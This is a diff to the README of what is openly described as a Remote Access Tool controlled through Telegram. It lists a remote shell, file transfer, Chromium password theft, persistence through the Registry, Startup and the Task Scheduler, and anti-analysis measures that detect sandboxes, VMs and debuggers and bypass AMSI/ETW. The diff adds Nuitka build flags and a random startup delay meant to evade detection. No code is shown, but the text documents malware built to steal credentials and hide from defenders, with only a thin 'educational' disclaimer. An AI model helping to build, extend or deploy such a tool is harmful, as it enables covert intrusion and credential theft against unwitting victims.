@@ -15,9 +15,9 @@ Remote Access Tool with Telegram C2.
 - Remote shell
 - File download / upload
 - MessageBox
-- Persistence (Registry Run + Startup)
+- Persistence (Registry Run + Startup + Task Scheduler)
 - Self-destruct
-- Anti-analysis (sandbox, VM, debugger, AMSI/ETW)
+- Anti-analysis (sandbox, VM, debugger, AMSI/ETW, startup delay)
 
 ## Structure
 
@@ -75,7 +75,10 @@ nuitka ^
   --enable-plugin=anti-bloat ^
   --assume-yes-for-downloads ^
   --remove-output ^
+  --lto=yes ^
+  --mingw64 ^
   --include-package=Crypto ^
+  --include-package=modules ^
   rat.py
 ```
 
@@ -107,5 +110,6 @@ Run the binary. You will receive an "online" message with the control keyboard i
 ## Notes
 
 - Chromium passwords require the user to be logged in (DPAPI / ABE).
-- Persistence is user-level.
+- Persistence is user-level + Task Scheduler.
+- Startup has a random delay (8-20s) before network activity.
 - For educational and research purposes only.
